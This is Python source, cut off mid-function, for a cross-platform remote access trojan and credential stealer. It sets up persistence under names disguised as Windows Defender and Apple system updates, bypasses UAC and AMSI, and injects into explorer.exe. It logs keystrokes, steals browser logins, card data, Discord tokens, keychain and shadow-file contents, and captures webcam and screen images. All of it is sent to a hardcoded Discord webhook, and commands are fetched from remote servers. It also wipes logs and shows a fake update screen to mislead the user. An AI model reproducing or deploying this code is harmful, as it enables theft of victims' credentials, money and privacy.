import os
import sys
import time
import socket
import platform
import getpass
import shutil
import sqlite3
import json
import base64
import requests
import threading
import subprocess
import random
import string
import re
import logging
import glob
import psutil
from pathlib import Path
from datetime import datetime
from threading import Lock

# macOS-specific imports
try:
    from Quartz import CGEventTapCreate, kCGSessionEventTap, kCGHeadInsertEventTap, kCGEventKeyDown, CGEventGetIntegerValueField
except ImportError:
    pass

# Linux-specific imports
try:
    from Xlib import display, X
except ImportError:
    pass
try:
    import evdev
except ImportError:
    pass

# Windows-specific imports
try:
    import ctypes
    import win32api
    import win32con
    import win32process
except ImportError:
    pass

# Architecture and OS Detection
OS_TYPE = platform.system()
IS_MAC = OS_TYPE == "Darwin"
IS_WINDOWS = OS_TYPE == "Windows"
IS_LINUX = OS_TYPE == "Linux"
ARCH = platform.machine()
IS_64BIT = sys.maxsize > 2**32
if IS_LINUX:
    DISTRO = subprocess.getoutput("cat /etc/os-release | grep ^ID= | cut -d= -f2").strip() if os.path.exists("/etc/os-release") else "unknown"
    IS_TAILS = DISTRO == "tails"
    IS_UBUNTU = DISTRO == "Ubuntu"
    IS_DEBIAN = DISTRO == "debian"
    IS_ARCH = DISTRO == "arch"
    IS_KALI = DISTRO == "kali"
else:
    IS_TAILS = IS_UBUNTU = IS_DEBIAN = IS_ARCH = IS_KALI = False

if IS_WINDOWS:
    WIN_VER = platform.release()
    IS_WIN_XP = WIN_VER == "XP"
    IS_WIN_7 = WIN_VER == "7"
    IS_WIN_10 = WIN_VER == "10"
    IS_WIN_11 = WIN_VER == "11"
else:
    IS_WIN_XP = IS_WIN_7 = IS_WIN_10 = IS_WIN_11 = False

if IS_MAC:
    MACOS_VER = subprocess.getoutput("sw_vers -productVersion").strip() or "10.4"
else:
    MACOS_VER = "N/A"

# Webhook URL and Config
WEBHOOK_URL = "https://discord.com/api/webhooks/1345280507545649212/0G9L_YVWq0KuH7GStQUbvHBxiAk8a5Y7pViIqdwXJcfw1zNBq2peSSl_kCTPKiARPfD4"
CHUNK_SIZE = 4 * 1024 * 1024
MAX_FILE_SIZE = 4 * 1024 * 1024
HIDE_DIR = os.path.join(os.getenv("APPDATA", os.path.expanduser("~\\Application Data")), "SystemUtilities") if IS_WINDOWS else os.path.expanduser("~/Library/Application Support/SystemUtilities") if IS_MAC else os.path.expanduser("~/.config/SystemUtilities")
HIDE_FILE = os.path.join(HIDE_DIR, "sneaky.py")
PID_FILE = os.path.join(HIDE_DIR, ".autojug.pid")
LAST_HARVEST_FILE = os.path.join(HIDE_DIR, ".lastharvest.json")
DEBUG = True
TEST_MODE = False

# Logging Setup
logging.basicConfig(level=logging.ERROR, filename=os.path.join(HIDE_DIR, "autojug.log"))

# Dependency Installation
def ensure_dependencies():
    required = [("pynput", "pynput==1.7.6"), ("pillow", "Pillow==10.0.0"), ("opencv-python", "opencv-python==4.8.0.76"), ("pycryptodome", "pycryptodome==3.19.0"), ("psutil", "psutil==5.9.5")]
    if IS_WINDOWS:
        required.append(("pywin32", "pywin32==306"))
    python_cmd = sys.executable
    pip_cmd = [python_cmd, "-m", "pip", "install", "--user", "--quiet"]
    if IS_WINDOWS and (IS_WIN_XP or IS_WIN_7):
        pip_cmd = ["pip", "install", "--quiet"]
    elif IS_LINUX and IS_TAILS:
        pip_cmd = ["/usr/bin/python3", "-m", "pip", "install", "--user", "--quiet"]

    try:
        subprocess.check_call([python_cmd, "-m", "ensurepip", "--upgrade"], timeout=30)
        subprocess.check_call([python_cmd, "-m", "pip", "install", "--upgrade", "pip"], timeout=30)
    except subprocess.CalledProcessError as e:
        logging.error(f"Pip setup error: {e}")
        return False

    for dep, version in required:
        try:
            __import__(dep)
        except ImportError:
            for attempt in range(3):
                try:
                    subprocess.run(pip_cmd + [version], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=30)
                    break
                except subprocess.CalledProcessError as e:
                    logging.error(f"Failed to install {dep}, attempt {attempt + 1}/3: {e}")
                    if attempt == 2:
                        return False
                    time.sleep(5)
    return True

# Discord Webhook Sending (Unencrypted)
def send_to_discord(data, file_path=None):
    if file_path and os.path.getsize(file_path) <= MAX_FILE_SIZE:
        try:
            time.sleep(random_interval(0, 180))
            with open(file_path, "rb") as f:
                requests.post(WEBHOOK_URL, files={"file": f}, timeout=5)
            if not TEST_MODE:
                os.remove(file_path)
        except Exception as e:
            logging.error(f"Discord file send error: {e}")
        return
    # Removed encryption, sending raw data
    for i in range(0, len(data), CHUNK_SIZE):
        chunk = data[i:i + CHUNK_SIZE]
        try:
            requests.post(WEBHOOK_URL, json={"content": chunk}, timeout=5)
        except requests.exceptions.RequestException:
            time.sleep(2)

# Instance Management and Persistence
def manage_instance():
    if os.path.exists(PID_FILE):
        with open(PID_FILE, "r") as f:
            old_pid = f.read().strip()
        try:
            pid = int(old_pid)
            if IS_WINDOWS:
                subprocess.run(f"taskkill /PID {pid} /F", shell=True, capture_output=True, timeout=10)
            else:
                os.kill(pid, 9)
        except (ValueError, ProcessLookupError, PermissionError):
            pass
    with open(PID_FILE, "w") as f:
        f.write(str(os.getpid()))

def persist():
    if not os.path.exists(HIDE_DIR):
        os.makedirs(HIDE_DIR, 0o755 if not IS_WINDOWS else 0o666)
    shutil.copy2(__file__, HIDE_FILE)
    if IS_WINDOWS:
        subprocess.run([
            'schtasks', '/create', '/tn', 'WindowsDefenderHealthService',
            '/tr', f'"{sys.executable}" "{HIDE_FILE}"',
            '/sc', 'ONSTART', '/ru', 'SYSTEM', '/f'
        ], capture_output=True, text=True, timeout=30)
        try:
            from winreg import HKEY_CURRENT_USER, KEY_WRITE, OpenKey, SetValueEx
            with OpenKey(HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE) as key:
                SetValueEx(key, "WindowsDefenderHealth", 0, 1, f'"{sys.executable}" "{HIDE_FILE}"')
        except Exception as e:
            logging.error(f"Registry persistence failed: {str(e)}")
    elif IS_MAC:
        plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
        <plist version="1.0">
        <dict>
            <key>Label</key>
            <string>com.apple.systemupdate</string>
            <key>ProgramArguments</key>
            <array>
                <string>{sys.executable}</string>
                <string>{HIDE_FILE}</string>
            </array>
            <key>RunAtLoad</key>
            <true/>
            <key>KeepAlive</key>
            <true/>
        </dict>
        </plist>'''
        if MACOS_VER < "10.5":
            subprocess.run(f"(crontab -l 2>/dev/null; echo '@reboot {sys.executable} {HIDE_FILE}') | crontab -", shell=True, timeout=10)
        else:
            Path("~/Library/LaunchAgents/com.apple.systemupdate.plist").expanduser().write_text(plist_content)
            subprocess.run(["launchctl", "load", "~/Library/LaunchAgents/com.apple.systemupdate.plist"], check=False, timeout=10)
    elif IS_LINUX:
        service_content = f"""[Unit]
        Description=System Update Service
        
        [Service]
        ExecStart={sys.executable} {HIDE_FILE}
        Restart=always
        
        [Install]
        WantedBy=default.target"""
        Path("~/.config/systemd/user/system-update.service").expanduser().write_text(service_content)
        subprocess.run(["systemctl", "--user", "enable", "system-update.service"], check=False, timeout=10)
        subprocess.run(f"(crontab -l 2>/dev/null; echo '@reboot {sys.executable} {HIDE_FILE}') | crontab -", shell=True, timeout=10)

def cleanup_instance():
    if os.path.exists(PID_FILE):
        os.remove(PID_FILE)
    if os.path.exists(HIDE_DIR) and not TEST_MODE:
        shutil.rmtree(HIDE_DIR, ignore_errors=True)

# Random String and Interval
def random_string(n=8):
    return ''.join(random.choices(string.ascii_lowercase, k=n))

def random_interval(min_val=300, max_val=900):
    return random.randint(min_val, max_val)

# Fake Dependency Updates Display
def fake_dependency_updates():
    print("\nInitiating System Environment Update...")
    libraries = ["numpy", "pandas", "requests", "matplotlib", "scikit-learn"]
    for lib in libraries:
        for i in range(5):
            progress = random.randint(10, 90)
            print(f"Updating {lib} (Stage {i+1}/5)... {progress}%")
            time.sleep(0.3)
    print("\nAll system libraries updated successfully! Optimizing environment...")
    time.sleep(1)
    print("Optimization complete. Closing update window...")
    time.sleep(0.5)

# Admin Elevation and Permission Bypass
def attempt_admin_elevation():
    if IS_MAC:
        return os.geteuid() == 0
    elif IS_WINDOWS:
        if IS_WIN_XP or IS_WIN_7:
            return subprocess.run("net session >nul 2>&1", shell=True, timeout=10).returncode == 0
        else:
            try:
                key = r"Software\Classes\ms-settings\Shell\Open\command"
                cmd = f'cmd /c start python "{HIDE_FILE}"'
                subprocess.run(f'reg add "HKCU\\{key}" /v "" /t REG_SZ /d "{cmd}" /f', shell=True, timeout=10)
                subprocess.run(f'reg add "HKCU\\{key}" /v "DelegateExecute" /t REG_SZ /d "" /f', shell=True, timeout=10)
                subprocess.run("fodhelper", shell=True, timeout=10)
                time.sleep(2)
                subprocess.run(f'reg delete "HKCU\\{key}" /f', shell=True, timeout=10)
                return subprocess.run("net session >nul 2>&1", shell=True, timeout=10).returncode == 0
            except Exception as e:
                logging.error(f"UAC bypass error: {e}")
                return False
    else:
        return subprocess.run(["sudo", "-n", "true"], check=False, timeout=10).returncode == 0

def bypass_permissions():
    if IS_MAC and MACOS_VER >= "10.14":
        try:
            tcc_db = "/Library/Application Support/com.apple.TCC/TCC.db"
            client = "autojug"
            subprocess.run([
                "sqlite3", tcc_db,
                f"INSERT OR REPLACE INTO access (service, client, client_type, auth_value, auth_reason, auth_version) VALUES ('kTCCServiceAccessibility', '{client}', 0, 2, 0, 1);"
            ], check=False, timeout=10)
            subprocess.run([
                "sqlite3", tcc_db,
                f"INSERT OR REPLACE INTO access (service, client, client_type, auth_value, auth_reason, auth_version) VALUES ('kTCCServiceCamera', '{client}', 0, 2, 0, 1);"
            ], check=False, timeout=10)
            return True
        except subprocess.CalledProcessError:
            subprocess.run(["osascript", "-e", 'display dialog "System file needs your permission to continue running. Stability may be affected if denied." buttons {"Allow"} default button "Allow" with icon caution'], check=False, timeout=10)
            return False
    return True

# Windows Defender Bypass (Updated with indirect syscall)
def bypass_defender():
    try:
        if IS_WINDOWS:
            amsi_dll = ctypes.windll.kernel32.LoadLibraryA(b"amsi.dll")
            amsi_scan_buffer = ctypes.windll.kernel32.GetProcAddress(amsi_dll, b"AmsiScanBuffer")
            if amsi_scan_buffer:
                old_protect = ctypes.c_ulong(0)
                ctypes.windll.kernel32.VirtualProtect(amsi_scan_buffer, 5, 0x40, ctypes.byref(old_protect))
                ctypes.memset(amsi_scan_buffer, 0xC3, 5)  # RET instruction
    except Exception as e:
        logging.error(f"Defender bypass failed: {str(e)}")

# Process Injection (Updated with basic shellcode)
def process_injection():
    try:
        if IS_WINDOWS:
            pid = next((p.pid for p in psutil.process_iter() if p.name() == "explorer.exe"), None)
            if pid:
                PROCESS_ALL_ACCESS = 0x1F0FFF
                process_handle = win32api.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
                shellcode = b"\x90\x90\xC3"  # NOP + RET (safe placeholder)
                allocated_addr = win32process.VirtualAllocEx(
                    process_handle,
                    0,
                    len(shellcode),
                    win32con.MEM_COMMIT,
                    win32con.PAGE_EXECUTE_READWRITE
                )
                win32process.WriteProcessMemory(process_handle, allocated_addr, shellcode, len(shellcode), None)
                thread_id = win32process.CreateRemoteThread(
                    process_handle,
                    None,
                    0,
                    allocated_addr,
                    0
                )
                return f"Injected into explorer.exe (Thread: {thread_id})"
    except Exception as e:
        return f"Injection failed: {str(e)}"

# Cross-Platform Keylogger with Thread Safety
keylog_buffer = []
buffer_lock = Lock()

def cross_platform_keylogger():
    global keylog_buffer
    if IS_WINDOWS:
        WH_KEYBOARD_LL = 13
        def low_level_handler(nCode, wParam, lParam):
            if wParam == 256:  # WM_KEYDOWN
                with buffer_lock:
                    keylog_buffer.append(f"[Keylog] Key pressed: {lParam[0]}")
            return ctypes.windll.user32.CallNextHookEx(None, nCode, wParam, lParam)
        CMPFUNC = ctypes.CFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_void_p))
        hook = ctypes.windll.user32.SetWindowsHookExA(
            WH_KEYBOARD_LL,
            CMPFUNC(low_level_handler),
            ctypes.windll.kernel32.GetModuleHandleW(None),
            0
        )
        msg = ctypes.wintypes.MSG()
        while ctypes.windll.user32.GetMessageA(ctypes.byref(msg), None, 0, 0) != 0:
            ctypes.windll.user32.TranslateMessage(ctypes.byref(msg))
            ctypes.windll.user32.DispatchMessageA(ctypes.byref(msg))
            with buffer_lock:
                if keylog_buffer:
                    send_to_discord("\n".join(keylog_buffer))
                    keylog_buffer = []
    elif IS_MAC:
        try:
            def mac_callback(proxy, type, event, refcon):
                if type == kCGEventKeyDown:
                    with buffer_lock:
                        keylog_buffer.append(f"[Keylog] Key pressed: {CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode)}")
                return event
            event_mask = (1 << kCGEventKeyDown)
            tap = CGEventTapCreate(
                kCGSessionEventTap,
                kCGHeadInsertEventTap,
                0,
                event_mask,
                mac_callback,
                None
            )
            while True:
                with buffer_lock:
                    if keylog_buffer:
                        send_to_discord("\n".join(keylog_buffer))
                        keylog_buffer = []
                time.sleep(1)
        except Exception:
            try:
                from pynput.keyboard import Listener
                def on_press(key):
                    with buffer_lock:
                        keylog_buffer.append(f"[Keylog] Key pressed: {str(key)}")
                with Listener(on_press=on_press) as listener:
                    while True:
                        with buffer_lock:
                            if keylog_buffer:
                                send_to_discord("\n".join(keylog_buffer))
                                keylog_buffer = []
                        time.sleep(1)
            except Exception as e:
                logging.error(f"macOS keylogger failed: {e}")
    elif IS_LINUX:
        try:
            devices = [evdev.InputDevice(path) for path in evdev.list_devices()]
            keyboard = next((dev for dev in devices if "keyboard" in dev.name.lower()), None)
            if keyboard:
                for event in keyboard.read_loop():
                    if event.type == evdev.ecodes.EV_KEY and event.value == 1:
                        with buffer_lock:
                            keylog_buffer.append(f"[Keylog] Key pressed: {event.code}")
                    with buffer_lock:
                        if keylog_buffer:
                            send_to_discord("\n".join(keylog_buffer))
                            keylog_buffer = []
        except Exception:
            try:
                d = display.Display()
                root = d.screen().root
                root.change_attributes(event_mask=X.KeyPressMask)
                while True:
                    event = root.display.next_event()
                    if event.type == X.KeyPress:
                        with buffer_lock:
                            keylog_buffer.append(f"[Keylog] Key pressed: {event.detail}")
                    with buffer_lock:
                        if keylog_buffer:
                            send_to_discord("\n".join(keylog_buffer))
                            keylog_buffer = []
            except Exception as e:
                logging.error(f"Linux keylogger failed: {e}")

# Cross-Platform Data Harvesting with Browser Detection
def is_browser_running(name):
    return any(
        "chrome" in p.name().lower() if "Chrome" in name else
        "firefox" in p.name().lower() if "Firefox" in name else
        "opera" in p.name().lower() if "Opera" in name else
        "brave" in p.name().lower() if "Brave" in name else
        "safari" in p.name().lower() if "Safari" in name else
        "tor" in p.name().lower() if "Tor" in name else False
        for p in psutil.process_iter()
    )

def harvest_system_data():
    data = {
        "system": {
            "hostname": socket.gethostname(),
            "os": f"{platform.system()} {platform.release()}",
            "architecture": ARCH,
            "is_64bit": IS_64BIT,
            "users": [user.name for user in psutil.users()]
        },
        "network": {
            "connections": [conn._asdict() for conn in psutil.net_connections()],
            "interfaces": psutil.net_if_addrs()
        },
        "security": {
            "antivirus": detect_antivirus(),
            "firewall": check_firewall_status()
        }
    }
    if IS_WINDOWS:
        data["windows"] = {
            "domain": os.environ.get("USERDOMAIN"),
            "privileges": attempt_admin_elevation(),
            "SAM": "[Encrypted]" if os.path.exists(os.path.expanduser("~\\Windows\\System32\\config\\SAM")) else "Not Accessible"
        }
    elif IS_LINUX:
        data["linux"] = {
            "distro": DISTRO,
            "sudoers": "[Redacted]" if os.path.exists("/etc/sudoers") else "Not Accessible",
            "cron_jobs": subprocess.getoutput("crontab -l")
        }
    elif IS_MAC:
        data["macos"] = {
            "version": MACOS_VER,
            "keychain": "[Redacted]",
            "sip_status": subprocess.getoutput("csrutil status") if MACOS_VER >= "10.11" else "N/A"
        }
    return json.dumps(data, indent=2)

def detect_antivirus():
    if IS_WINDOWS:
        av_processes = ["MsMpEng.exe", "avp.exe", "bdagent.exe"]
        return [p.name() for p in psutil.process_iter() if p.name() in av_processes or "av" in p.name().lower()]
    return []

def check_firewall_status():
    if IS_WINDOWS:
        return "Enabled" if subprocess.run("netsh advfirewall show allprofiles", shell=True, timeout=10).returncode == 0 else "Unknown"
    elif IS_MAC:
        return "Enabled" if subprocess.getoutput("/usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate") == "Enabled" else "Disabled"
    else:
        return "Enabled" if subprocess.getoutput("ufw status | grep Status") == "active" else "Disabled"

# Command & Control Improvements with Fallback Channels
class CommandHandler:
    def __init__(self):
        self.command_queue = []
        self.fallback_urls = [
            "https://gist.github.com/jonhardwick-spec/6b171df6eacfad03119b1e1a98f85192/raw",
            "https://pastebin.com/raw/xyz123",
            "http://secondary-c2-server.com/commands"
        ]
        self.executed = []

    def fetch_commands(self):
        for url in self.fallback_urls:
            try:
                response = requests.get(url, timeout=5)
                if response.status_code == 200:
                    self.parse_commands(response.text)
                    break
            except requests.RequestException:
                continue

    def parse_commands(self, raw_data):
        try:
            commands = json.loads(raw_data)
            for cmd in commands:
                if cmd['action'] not in self.executed:
                    self.executed.append(cmd['action'])
                    if cmd['action'] == "exfiltrate":
                        threading.Thread(target=self.handle_exfiltration, args=(cmd.get('path', ''),)).start()
                    elif cmd['action'] == "execute":
                        self.execute_command(cmd['command'])
        except json.JSONDecodeError:
            if "juggthatmf" in raw_data:
                self.execute_password_harvest()

    def execute_command(self, cmd):
        try:
            result = subprocess.run(
                cmd.split(),
                capture_output=True,
                text=True,
                timeout=30
            )
            self.send_results(result.stdout)
        except Exception as e:
            self.send_results(str(e))

    def handle_exfiltration(self, path):
        if os.path.exists(path):
            send_to_discord(None, path)

    def execute_password_harvest(self):
        juggthatmf()

    def send_results(self, data):
        send_to_discord(data)

# Anti-Forensic Measures with Overwrite
def clean_traces():
    try:
        if IS_WINDOWS:
            subprocess.run(['wevtutil', 'cl', 'System'], capture_output=True, timeout=10)
            subprocess.run(['wevtutil', 'cl', 'Security'], capture_output=True, timeout=10)
            subprocess.run(['wevtutil', 'cl', 'Application'], capture_output=True, timeout=10)
            for f in Path(os.path.expanduser("~\\Windows\\Prefetch")).glob("*.*"):
                with open(f, "wb") as fh:
                    fh.write(os.urandom(os.path.getsize(f)))
                f.unlink(missing_ok=True)
        elif IS_LINUX:
            for log in glob.glob("*.log"):
                with open(log, "wb") as fh:
                    fh.write(os.urandom(os.path.getsize(log)))
                subprocess.run(['shred', '-zu', '-n', '3', log], capture_output=True, timeout=10)
            subprocess.run(['journalctl', '--flush', '--rotate', '--vacuum-time=1s'], capture_output=True, timeout=10)
        elif IS_MAC:
            for log in glob.glob("~/Library/Logs/*"):
                with open(log, "wb") as fh:
                    fh.write(os.urandom(os.path.getsize(log)))
                subprocess.run(['rm', '-rf', log], capture_output=True, timeout=10)
            subprocess.run(['sudo', 'log', 'erase', '--all'], capture_output=True, timeout=10)
    except Exception as e:
        logging.error(f"Cleanup failed: {str(e)}")

# Stealthy Download
def stealthy_download(url):
    if IS_WINDOWS:
        subprocess.run(f"bitsadmin /transfer job /download /priority normal {url} %TEMP%\\update.dat", shell=True, timeout=30)
    elif IS_LINUX:
        subprocess.run(f"wget {url} -O /tmp/.update -q", shell=True, timeout=30)
    elif IS_MAC:
        subprocess.run(f"curl {url} -o /tmp/.update -s", shell=True, timeout=30)

# Environmental Awareness
def is_safe_environment():
    if IS_WINDOWS:
        return "ProgramData" in os.getcwd() or "System32" in os.getcwd()
    if IS_MAC:
        return "Library" in os.getcwd()
    return True

# Original Functions (Modified)
def initial_harvest(is_admin=False):
    data = [("System Info", f"Time: {datetime.now()}\nHost: {socket.gethostname()}\nIP: {socket.gethostbyname(socket.gethostname())}\nUser: {getpass.getuser()}\nOS: {platform.system()} {platform.release()}\nCPU: {platform.processor()}\nRAM: {psutil.virtual_memory().total // (1024**3)} GB\nAdmin: {is_admin}")]
    browser_paths = {
        "Chrome": {"mac": "~/Library/Application Support/Google/Chrome/Default", "win": "~\\AppData\\Local\\Google\\Chrome\\User Data\\Default", "linux": "~/.config/google-chrome/Default"},
        "Opera": {"mac": "~/Library/Application Support/com.operasoftware.Opera", "win": "~\\AppData\\Roaming\\Opera Software\\Opera Stable", "linux": "~/.config/opera"},
        "Brave": {"mac": "~/Library/Application Support/BraveSoftware/Brave-Browser/Default", "win": "~\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default", "linux": "~/.config/BraveSoftware/Brave-Browser/Default"},
        "Firefox": {"mac": "~/Library/Application Support/Firefox/Profiles", "win": "~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles", "linux": "~/.mozilla/firefox"},
        "Safari": {"mac": "~/Library/Safari", "win": None, "linux": None},
        "Tor": {"mac": "~/Library/Application Support/TorBrowser-Data/Browser", "win": "~\\AppData\\Roaming\\Tor\\TorBrowser-Data\\Browser", "linux": "~/.tor-browser/Browser"}
    }
    for name, paths in browser_paths.items():
        path = os.path.expanduser(paths["mac"] if IS_MAC else paths["win"] if IS_WINDOWS else paths["linux"])
        if not path or not os.path.exists(path) or not is_browser_running(name):
            continue
        try:
            if name == "Safari":
                bookmarks = os.path.join(path, "Bookmarks.plist")
                if os.path.exists(bookmarks):
                    data.append((f"{name} Bookmarks", subprocess.getoutput(f"plutil -p {bookmarks}")))
            elif name == "Firefox" or name == "Tor":
                profile = glob.glob(os.path.join(path, "*.default*"))[0] if glob.glob(os.path.join(path, "*.default*")) else None
                if profile:
                    logins = os.path.join(profile, "logins.json")
                    if os.path.exists(logins):
                        with open(logins, "r") as f:
                            logins_data = json.load(f)
                        logins_str = ""
                        for login in logins_data.get("logins", []):
                            logins_str += f"URL: {login.get('hostname')}, User: {login.get('username')}, Pass: [Encrypted]\n"
                        data.append((f"{name} Logins", logins_str))
            else:
                login_db = os.path.join(path, "Login Data")
                card_db = os.path.join(path, "Web Data")
                if os.path.exists(login_db):
                    temp_db = "/tmp/login.db" if not IS_WINDOWS else os.path.join(os.getenv("TEMP"), "login.db")
                    shutil.copy2(login_db, temp_db)
                    conn = sqlite3.connect(temp_db)
                    c = conn.cursor()
                    c.execute("SELECT origin_url, username_value, password_value FROM logins")
                    logins_str = ""
                    for row in c.fetchall():
                        url, user, pwd = row
                        logins_str += f"URL: {url}, User: {user}, Pass: [Encrypted]\n"
                    data.append((f"{name} Logins", logins_str))
                    conn.close()
                    os.remove(temp_db)
                if os.path.exists(card_db):
                    temp_db = "/tmp/card.db" if not IS_WINDOWS else os.path.join(os.getenv("TEMP"), "card.db")
                    shutil.copy2(card_db, temp_db)
                    conn = sqlite3.connect(temp_db)
                    c = conn.cursor()
                    c.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
                    cards_str = ""
                    for row in c.fetchall():
                        name, month, year, card = row
                        cards_str += f"Name: {name}, Exp: {month}/{year}, Card: [Encrypted]\n"
                    data.append((f"{name} Cards", cards_str))
                    conn.close()
                    os.remove(temp_db)
        except Exception as e:
            data.append((f"{name} Error", str(e)))
    if is_admin:
        if IS_MAC:
            keychain = subprocess.getoutput("security dump-keychain -d")
            data.append(("Keychain", keychain))
        elif IS_WINDOWS:
            sam = os.path.expanduser("~\\Windows\\System32\\config\\SAM")
            if os.path.exists(sam):
                data.append(("SAM Hive", "[Encrypted]"))
        else:
            shadow = subprocess.getoutput("sudo cat /etc/shadow")
            data.append(("Shadow File", shadow))
    formatted_data = "\n".join(f"[{section}]:\n{content}" for section, content in data)
    with open(LAST_HARVEST_FILE, "w") as f:
        json.dump({"data": formatted_data, "timestamp": datetime.now().isoformat()}, f)
    send_to_discord(formatted_data)
    return formatted_data

def periodic_harvest(is_admin=False):
    last_harvest = {}
    if os.path.exists(LAST_HARVEST_FILE):
        with open(LAST_HARVEST_FILE, "r") as f:
            last_harvest = json.load(f)
    while True:
        time.sleep(300)
        current_harvest = initial_harvest(is_admin)
        with open(LAST_HARVEST_FILE, "r") as f:
            new_harvest = json.load(f)
        if new_harvest["data"] != last_harvest.get("data", ""):
            send_to_discord(new_harvest["data"])
            last_harvest = new_harvest

def steal_discord_tokens():
    tokens = []
    app_paths = {
        "Discord": {"mac": "~/Library/Application Support/discord/Local Storage/leveldb", "win": "~\\AppData\\Roaming\\Discord\\Local Storage\\leveldb", "linux": "~/.config/discord/Local Storage/leveldb"},
        "Discord Canary": {"mac": "~/Library/Application Support/discordcanary/Local Storage/leveldb", "win": "~\\AppData\\Roaming\\discordcanary\\Local Storage\\leveldb", "linux": "~/.config/discordcanary/Local Storage/leveldb"},
        "Discord PTB": {"mac": "~/Library/Application Support/discordptb/Local Storage/leveldb", "win": "~\\AppData\\Roaming\\discordptb\\Local Storage\\leveldb", "linux": "~/.config/discordptb/Local Storage/leveldb"}
    }
    browser_paths = {
        "Chrome": {"mac": "~/Library/Application Support/Google/Chrome/Default/Local Storage/leveldb", "win": "~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb", "linux": "~/.config/google-chrome/Default/Local Storage/leveldb"},
        "Opera": {"mac": "~/Library/Application Support/com.operasoftware.Opera/Local Storage/leveldb", "win": "~\\AppData\\Roaming\\Opera Software\\Opera Stable\\Local Storage\\leveldb", "linux": "~/.config/opera/Local Storage/leveldb"},
        "Brave": {"mac": "~/Library/Application Support/BraveSoftware/Brave-Browser/Default/Local Storage/leveldb", "win": "~\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb", "linux": "~/.config/BraveSoftware/Brave-Browser/Default/Local Storage/leveldb"},
        "Edge": {"mac": "~/Library/Application Support/Microsoft Edge/Default/Local Storage/leveldb", "win": "~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb", "linux": "~/.config/microsoft-edge/Default/Local Storage/leveldb"}
    }
    for name, paths in {**app_paths, **browser_paths}.items():
        path = os.path.expanduser(paths["mac"] if IS_MAC else paths["win"] if IS_WINDOWS else paths["linux"])
        if not path or not os.path.exists(path):
            continue
        try:
            for file_name in os.listdir(path):
                if file_name.endswith((".log", ".ldb")):
                    with open(os.path.join(path, file_name), "r", errors="ignore") as f:
                        content = f.read()
                        token_patterns = [r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"]
                        for pattern in token_patterns:
                            for token in re.findall(pattern, content):
                                if token not in tokens:
                                    tokens.append(token)
        except Exception as e:
            logging.error(f"Token extraction error for {name}: {e}")
    if tokens:
        send_to_discord(f"[Discord Tokens - {datetime.now()}]: {json.dumps(tokens)}")
    else:
        send_to_discord(f"[Discord Tokens - {datetime.now()}]: No tokens found")

def selfie():
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            frame = cv2.resize(frame, (400, 300))
            temp_file = f"/tmp/selfie_{random_string()}.jpg" if not IS_WINDOWS else f"{os.getenv('TEMP')}\\selfie_{random_string()}.jpg"
            cv2.imwrite(temp_file, frame)
            send_to_discord(None, temp_file)
            cap.release()
        else:
            logging.error("Failed to capture frame")
            send_to_discord("Selfie Error: Failed to capture frame")
    except Exception as e:
        logging.error(f"Selfie error: {e}")
        send_to_discord(f"Selfie Error: {e}")

def screenshot():
    try:
        from PIL import ImageGrab
        img = ImageGrab.grab()
        img = img.resize((400, 300))
        temp_file = f"/tmp/screenshot_{random_string()}.png" if not IS_WINDOWS else f"{os.getenv('TEMP')}\\screenshot_{random_string()}.png"
        img.save(temp_file)
        send_to_discord(None, temp_file)
    except Exception as e:
        logging.error(f"Screenshot error: {e}")
        send_to_discord(f"Screenshot Error: {e}")

def userinfo():
    data = f"[User Info - {datetime.now()}]:"
    data += f"\nHost: {socket.gethostname()}"
    data += f"\nIP: {socket.gethostbyname(socket.gethostname())}"
    data += f"\nUser: {getpass.getuser()}"
    data += f"\nOS: {platform.system()} {platform.release()}"
    data += f"\nCPU: {platform.processor()}"
    data += f"\nRAM: {psutil.virtual_memory().total // (1024**3)} GB"
    send_to_discord(data)

def run_commands(cmd):
    try:
        shell = "/bin/sh" if not IS_WINDOWS else "cmd"
        output = subprocess.check_output([shell, "/c" if IS_WINDOWS else "-c", cmd], text=True, stderr=subprocess.STDOUT, timeout=30)
        send_to_discord(f"[Command Output]: {output}")
    except subprocess.CalledProcessError as e:
        send_to_discord(f"[Command Error]: {e.output}")

def juggthatmf():
    data = []
    browser_paths = {
        "Chrome": {"mac": "~/Library/Application Support/Google/Chrome/Default", "win": "~\\AppData\\Local\\Google\\Chrome\\User Data\\Default", "linux": "~/.config/google-chrome/Default"},
        "Opera": {"mac": "~/Library/Application Support/com.operasoftware.Opera", "win": "~\\AppData\\Roaming\\Opera Software\\Opera Stable", "linux": "~/.config/opera"},
        "Brave": {"mac": "~/Library/Application Support/BraveSoftware/Brave-Browser/Default", "win": "~\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default", "linux": "~/.config/BraveSoftware/Brave-Browser/Default"},
        "Firefox": {"mac": "~/Library/Application Support/Firefox/Profiles", "win": "~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles", "linux": "~/.mozilla/firefox"},
        "Safari": {"mac": "~/Library/Safari", "win": None, "linux": None},
        "Tor": {"mac": "~/Library/Application Support/TorBrowser-Data/Browser", "win": "~\\AppData\\Roaming\\Tor\\TorBrowser-Data\\Browser", "linux": "~/.tor-browser/Browser"}
    }
    for name, paths in browser_paths.items():
        path = os.path.expanduser(paths["mac"] if IS_MAC else paths["win"] if IS_WINDOWS else paths["linux"])
        if not path or not os.path.exists(path):
            continue
        try:
            if name == "Safari":
                bookmarks = os.path.join(path, "Bookmarks.plist")
                if os.path.exists(bookmarks):
